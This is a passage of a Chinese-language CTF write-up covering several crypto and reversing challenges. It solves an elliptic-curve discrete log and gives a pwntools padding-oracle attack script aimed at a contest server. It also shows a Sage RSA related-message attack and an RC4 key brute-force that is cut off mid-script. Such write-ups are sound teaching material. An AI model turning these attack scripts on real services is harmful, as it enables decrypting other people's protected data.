discrete logarithm for each prime order</span><br><span class="line"></span><br><span class="line">l = crt(dlogs,primes)</span><br><span class="line">print(l)</span><br></pre></td></tr></table></figure></p>
<p>可以计算k<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">factor: 4, Discrete Log: 2</span><br><span class="line">factor: 3, Discrete Log: 2</span><br><span class="line">factor: 5, Discrete Log: 4</span><br><span class="line">factor: 7, Discrete Log: 1</span><br><span class="line">factor: 137, Discrete Log: 70</span><br><span class="line">factor: 593, Discrete Log: 459</span><br><span class="line">factor: 24337, Discrete Log: 4079</span><br><span class="line">factor: 25589, Discrete Log: 22677</span><br><span class="line">factor: 3637793, Discrete Log: 192569</span><br><span class="line">factor: 5733569, Discrete Log: 123222</span><br><span class="line">241442528183133391090263659954</span><br></pre></td></tr></table></figure></p>
<p>观察到题目的加密流程<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(B,flag)</span>:</span></span><br><span class="line">    M=[]</span><br><span class="line">    (x,y)=B</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        M.append(str((int(i)*x)%p))</span><br><span class="line">    <span class="keyword">return</span> M</span><br></pre></td></tr></table></figure></p>
<p>我们只要求逆元乘回去即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(B,cipher)</span>:</span></span><br><span class="line">    M = []</span><br><span class="line">    (x, y) = B</span><br><span class="line">    d = gmpy2.invert(x,p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">        M.append(str((int(i) * d) % p))</span><br><span class="line">    <span class="keyword">return</span> M</span><br></pre></td></tr></table></figure></p>
<p>最后完整解题代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p=<span class="number">93556643250795678718734474880013829509320385402690660619699653921022012489089</span></span><br><span class="line">a=<span class="number">66001598144012865876674115570268990806314506711104521036747533612798434904785</span></span><br><span class="line">b=<span class="number">25255205054024371783896605039267101837972419055969636393425590261926131199030</span></span><br><span class="line">P=(<span class="number">56027910981442853390816693056740903416379421186644480759538594137486160388926</span>, <span class="number">65533262933617146434438829354623658858649726233622196512439589744498050226926</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(p,a,b,P,Q)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> P==(<span class="number">0</span>,<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> Q</span><br><span class="line">    <span class="keyword">if</span> Q==(<span class="number">0</span>,<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> P</span><br><span class="line">    <span class="keyword">if</span> P!=(<span class="number">0</span>,<span class="number">0</span>) <span class="keyword">and</span> Q!=(<span class="number">0</span>,<span class="number">0</span>):</span><br><span class="line">        (Px,Py),(Qx,Qy)=P,Q</span><br><span class="line">        <span class="keyword">if</span> P!=Q:</span><br><span class="line">            s=(Qy - Py) * gmpy2.invert(Qx - Px, p) % p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s=(<span class="number">3</span> * Px ** <span class="number">2</span> + a) * gmpy2.invert(<span class="number">2</span> * Py, p) % p</span><br><span class="line">        Rx=(s**<span class="number">2</span>-Px-Qx)%p</span><br><span class="line">        Ry=(s*Px-s*Rx-Py)%p</span><br><span class="line">        <span class="keyword">return</span> int(Rx),int(Ry)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bits</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> n:</span><br><span class="line">        <span class="keyword">yield</span> n &amp; <span class="number">1</span></span><br><span class="line">        n &gt;&gt;=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">double_and_add</span><span class="params">(n,p,a,b,P)</span>:</span></span><br><span class="line">    Q=P</span><br><span class="line">    result=(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> bits(n):</span><br><span class="line">        <span class="keyword">if</span> bit==<span class="number">1</span>:</span><br><span class="line">            result=add(p,a,b,result,Q)</span><br><span class="line">        Q=add(p,a,b,Q,Q)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(B,flag)</span>:</span></span><br><span class="line">    M=[]</span><br><span class="line">    (x,y)=B</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        M.append(str((int(i)*x)%p))</span><br><span class="line">    <span class="keyword">return</span> M</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(B,cipher)</span>:</span></span><br><span class="line">    M = []</span><br><span class="line">    (x, y) = B</span><br><span class="line">    d = gmpy2.invert(x,p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">        M.append(str((int(i) * d) % p))</span><br><span class="line">    <span class="keyword">return</span> M</span><br><span class="line">c=[<span class="string">'59606574942045237892160565660789485179761474793536568061197611839605420346341'</span>, <span class="string">'47875019928315975935470451251861629803812269197911544058574875780767887781883'</span>, <span class="string">'47875019928315975935470451251861629803812269197911544058574875780767887781883'</span>, <span class="string">'87395068884892630805602977284140888323072523242568617217106051341924998180285'</span>, <span class="string">'46630423195878630891974017244302408005523563020190564609208709685671882231257'</span>, <span class="string">'75663513871163368848912862875213032947123317646943593214483315283087465615827'</span>, <span class="string">'85854675293416868827320102885172653026510557702538106366457650697150744603084'</span>, <span class="string">'65472352448909868870505622865253412867736077591349080062508979869024186628570'</span>, <span class="string">'53740797435180606913815508456325557491786871995724056059886243810186654064112'</span>, <span class="string">'29033090675284737956938845630910624941599754626753028605274605597415583384570'</span>, <span class="string">'46630423195878630891974017244302408005523563020190564609208709685671882231257'</span>, <span class="string">'75663513871163368848912862875213032947123317646943593214483315283087465615827'</span>, <span class="string">'85854675293416868827320102885172653026510557702538106366457650697150744603084'</span>, <span class="string">'65472352448909868870505622865253412867736077591349080062508979869024186628570'</span>, <span class="string">'53740797435180606913815508456325557491786871995724056059886243810186654064112'</span>, <span class="string">'79988897786552237848975045680708725338535954904725594365146282667731978320855'</span>, <span class="string">'46630423195878630891974017244302408005523563020190564609208709685671882231257'</span>, <span class="string">'87395068884892630805602977284140888323072523242568617217106051341924998180285'</span>, <span class="string">'47875019928315975935470451251861629803812269197911544058574875780767887781883'</span>, <span class="string">'59606574942045237892160565660789485179761474793536568061197611839605420346341'</span>, <span class="string">'68553139631861392827071371663189883460860008671410101763805781158572693782972'</span>]</span><br><span class="line">C1=(<span class="number">86892541043117403764803129862679079014029734149331061618933412161852971278663</span>, <span class="number">76398582431519045045640039001896036904727467709248934373737249884161020619730</span>)</span><br><span class="line">k=<span class="number">241442528183133391090263659954</span></span><br><span class="line">kc1 = double_and_add(k,p,a,b,C1)</span><br><span class="line">flag = decrypt(kc1,c)</span><br><span class="line">res = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    res+=chr(int(i))</span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure></p>
<p>运行后得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;GOOD LUCK, LUCKY DOG!&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="crypto3"><a href="#crypto3" class="headerlink" title="crypto3"></a>crypto3</h3><p>nc 117.34.112.241 1279<br>此题是一道Padding oracle attack的题目<br>详细介绍可以参照我的这篇文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://skysec.top/2017/12/13/padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</span><br></pre></td></tr></table></figure></p>
<p>这里我直接给出利用脚本了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">result = <span class="string">''</span></span><br><span class="line">result1=<span class="string">''</span></span><br><span class="line">encode = <span class="string">'\x03\xc1\x1c\x98\x0e\x8a\x75\xf4\x6b\x04\x83\xeb\x3b\x58\xa1\x3a\x31\xe8\x26\x08\xe2\x44\x5e\xa1\x05\xd9\xc7\x86\x8b\xd9\x75\x9a'</span></span><br><span class="line">encode1 = encode[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">encode2 = encode[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">encode3 = <span class="string">'123456789ABCDEFG'</span></span><br><span class="line">p = remote(<span class="string">'117.34.112.241'</span>,<span class="number">1279</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'crack violently!\n'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dd</span><span class="params">(datab)</span>:</span></span><br><span class="line"></span><br><span class="line">    p.send(<span class="string">'2\n'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"bytes ciphertext\n"</span>)</span><br><span class="line">    p.sendline(encode1)</span><br><span class="line">    p.recvuntil(<span class="string">'IV\n'</span>)</span><br><span class="line">    p.sendline(datab)</span><br><span class="line">    zz = p.recvline()</span><br><span class="line">    <span class="keyword">print</span> zz</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"good"</span> <span class="keyword">in</span> zz:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'success'</span></span><br><span class="line">        <span class="keyword">print</span> datab</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'false'</span></span><br><span class="line">jj = <span class="string">''</span></span><br><span class="line">xx = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">17</span>):</span><br><span class="line">    <span class="keyword">for</span> z <span class="keyword">in</span> result1:</span><br><span class="line">        xx += chr(ord(z)^j)            </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">print</span> i</span><br><span class="line">        ss = (<span class="number">15</span>-len(result1)) * chr(<span class="number">0</span>)</span><br><span class="line">        ss = ss +chr(i)+xx</span><br><span class="line">        <span class="keyword">if</span> dd(ss):</span><br><span class="line">            wrp= chr(i^j^ord(encode3[<span class="number">16</span>-j]))</span><br><span class="line">            result += wrp</span><br><span class="line">            jj = chr(ord(wrp))+jj </span><br><span class="line">            result1 = chr(i^j) + result1</span><br><span class="line">            <span class="keyword">print</span> jj</span><br><span class="line">            xx = <span class="string">''</span></span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p>用iv和encode1得到第一段明文<br><img src="/images/2018shanxi (25).jpg"><br>用encode1和encode2得到第二段明文<br><img src="/images/2018shanxi (26).jpg"></p>
<h3 id="crypto4"><a href="#crypto4" class="headerlink" title="crypto4"></a>crypto4</h3><p>题目描述<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在Alice用帐户名和密码登录一个用RSA加密通信的网站的过程中，不小心将密码的最后一位字符的大小写弄错了，于是重新输入，这一过程恰好被攻击者K监听到，并截获了这两条密文。那么攻击者就能很容易破解出Alice的密码，求出这个密码，提交FLAG。</span><br></pre></td></tr></table></figure></p>
<p>可以看到加密的明文消息只有1位不同，相差32,查到一篇相关文章<br>参考链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ZoEplA/Team233/blob/0bb364f2aef8775230c9552d75465ef6a6aa1fb5/2018/wp/redhet/Team233%20writeup.md</span><br></pre></td></tr></table></figure></p>
<p>效仿其中的代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># solve.sage</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span><span class="params">(c1, c2, diff, e, n)</span>:</span></span><br><span class="line">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+diff)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(g1, g2)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">n = <span class="number">27262030738190162906068533309218248319312037416856794814532459866130196673561833084739048171769479893806671499522643803412108279907223895517897969906253626028270289028646596897429641138913001561947557784840311014399973312098056896539904624036584153785225626096007313018814076860235378686567457599895712604364100507424939342862464483596795761725357279364545154915110900098124905389351969357103586063992040096368146580315262263546850581515833590884397726108478477798668261762306189036525841356592859315437201733146083995028221597538824801113980100295046731791678895520928441645173205511865657977068061078456941189550383</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">c2 = <span class="number">80256065280425989347153660555632253204654757632704797390559450985825600409910703812294413750536361555897348650491697548574007864446117693097103136799284683292648287334023253488891301144881769557674366138889636475162525325855368132832237345279798028008137655682278413635753791609965810603989005785747744993045461207072415730041608172272077090225741385971</span></span><br><span class="line">c1 = <span class="number">80256065280425989347153660555632253204654757632704797390559450985825600409910703812294413750536361555897348650491699334745453065435184774282609871793525447798655880850590288431173204818294305809864531293135689257716648980215360552397800418527073621708108066406898267720300730094465977262440649283179655484278496374936325875186126245693549228697550672467</span></span><br><span class="line"></span><br><span class="line">diff = <span class="number">32</span></span><br><span class="line">m = related_message_attack(c2, c1, diff, e, n)</span><br><span class="line">flag = (<span class="string">'%x'</span> % m).decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure></p>
<p>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my password is: I_Lov5_RSA_Rel6te7_me8sagE_aTTacK</span><br></pre></td></tr></table></figure></p>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h3><p>由于re1实际上也是密码题。。所以我也做了一下<br>将题目给的pyc反编译一下，得到代码如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit http://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodestr</span><span class="params">(string)</span>:</span></span><br><span class="line">    UC_KEY = <span class="string">'123456789'</span></span><br><span class="line">    key = md5(UC_KEY.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    keya = md5(key[<span class="number">0</span>:<span class="number">16</span>].encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    keyb = md5(key[<span class="number">16</span>:<span class="number">32</span>].encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    ckey_length = <span class="number">4</span></span><br><span class="line">    keyc = md5(string.encode(<span class="string">'utf-8'</span>)).hexdigest()[-ckey_length:]</span><br><span class="line">    cryptkey = md5((keya + keyc).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    key_length = len(cryptkey)</span><br><span class="line">    expiry = <span class="number">20</span></span><br><span class="line">    string = <span class="string">'%10d'</span> % expiry + md5((string + keyb).encode(<span class="string">'utf-8'</span>)).hexdigest()[<span class="number">0</span>:<span class="number">16</span>] + string</span><br><span class="line">    box = range(<span class="number">256</span>)</span><br><span class="line">    rndkey = [</span><br><span class="line">        <span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        rndkey[i] = ord(cryptkey[i % key_length])</span><br><span class="line">    </span><br><span class="line">    string_length = len(string)</span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        j = (j + box[i] + rndkey[i]) % <span class="number">256</span></span><br><span class="line">        tmp = box[i]</span><br><span class="line">        box[i] = box[j]</span><br><span class="line">        box[j] = tmp</span><br><span class="line">    </span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(string_length):</span><br><span class="line">        a = (a + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[a]) % <span class="number">256</span></span><br><span class="line">        tmp = box[a]</span><br><span class="line">        box[a] = box[j]</span><br><span class="line">        box[j] = tmp</span><br><span class="line">        result += chr(ord(string[i]) ^ box[(box[a] + box[j]) % <span class="number">256</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    str1 = raw_input(<span class="string">'please enter the flag:'</span>)</span><br><span class="line">    res = encodestr(str1)</span><br><span class="line">    lenn = len(res)</span><br><span class="line">    d = [</span><br><span class="line">        <span class="number">128</span>,</span><br><span class="line">        <span class="number">220</span>,</span><br><span class="line">        <span class="number">109</span>,</span><br><span class="line">        <span class="number">113</span>,</span><br><span class="line">        <span class="number">242</span>,</span><br><span class="line">        <span class="number">153</span>,</span><br><span class="line">        <span class="number">181</span>,</span><br><span class="line">        <span class="number">203</span>,</span><br><span class="line">        <span class="number">21</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">2</span>,</span><br><span class="line">        <span class="number">101</span>,</span><br><span class="line">        <span class="number">42</span>,</span><br><span class="line">        <span class="number">55</span>,</span><br><span class="line">        <span class="number">56</span>,</span><br><span class="line">        <span class="number">19</span>,</span><br><span class="line">        <span class="number">190</span>,</span><br><span class="line">        <span class="number">181</span>,</span><br><span class="line">        <span class="number">99</span>,</span><br><span class="line">        <span class="number">47</span>,</span><br><span class="line">        <span class="number">217</span>,</span><br><span class="line">        <span class="number">109</span>,</span><br><span class="line">        <span class="number">129</span>,</span><br><span class="line">        <span class="number">221</span>,</span><br><span class="line">        <span class="number">9</span>,</span><br><span class="line">        <span class="number">65</span>,</span><br><span class="line">        <span class="number">235</span>,</span><br><span class="line">        <span class="number">48</span>,</span><br><span class="line">        <span class="number">197</span>,</span><br><span class="line">        <span class="number">103</span>,</span><br><span class="line">        <span class="number">123</span>,</span><br><span class="line">        <span class="number">86</span>,</span><br><span class="line">        <span class="number">25</span>,</span><br><span class="line">        <span class="number">112</span>,</span><br><span class="line">        <span class="number">172</span>,</span><br><span class="line">        <span class="number">175</span>,</span><br><span class="line">        <span class="number">42</span>,</span><br><span class="line">        <span class="number">168</span>,</span><br><span class="line">        <span class="number">232</span>,</span><br><span class="line">        <span class="number">81</span>,</span><br><span class="line">        <span class="number">224</span>,</span><br><span class="line">        <span class="number">170</span>,</span><br><span class="line">        <span class="number">16</span>,</span><br><span class="line">        <span class="number">210</span>,</span><br><span class="line">        <span class="number">98</span>,</span><br><span class="line">        <span class="number">229</span>,</span><br><span class="line">        <span class="number">15</span>,</span><br><span class="line">        <span class="number">30</span>,</span><br><span class="line">        <span class="number">134</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(lenn):</span><br><span class="line">        <span class="keyword">if</span> ord(res[i]) == d[i] <span class="keyword">or</span> i == lenn - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'you get it'</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'wrong'</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p>不难看出，和rc4密钥相关的明文输入只有4位，那么我们可以选择爆破这4位<br>而rc4的算法未：<br>keystream xor mes = cipher<br>所以我们只需要爆破4位未知密钥，然后生成密钥流和密文异或即可<br>脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit http://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodestr</span><span class="params">(string,keyc)</span>:</span></span><br><span class="line">    UC_KEY 